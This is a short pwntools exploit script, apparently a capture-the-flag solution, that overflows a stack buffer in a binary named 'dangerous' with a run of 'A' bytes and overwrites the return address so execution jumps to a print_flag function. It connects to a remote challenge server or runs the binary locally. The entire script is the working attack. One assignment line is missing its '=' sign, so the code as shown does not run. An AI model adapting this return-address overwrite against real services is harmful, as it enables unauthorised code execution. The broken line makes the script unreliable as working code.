#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'split', '-h']
print_flag_addr = 0x40130e

elf = ELF('dangerous')

if args.REMOTE:
	p = remote('jh2i.com', 50011)
else:
	p  process(elf.path)

	if args.GDB:
		gdb.attach(p, '''
			break * 0x40130c
			continue
			''')

padding = b'A' * (0x218 - 39)
payload = padding + p64(print_flag_addr)

p.sendafter(b'?\n', payload)

p.interactive()
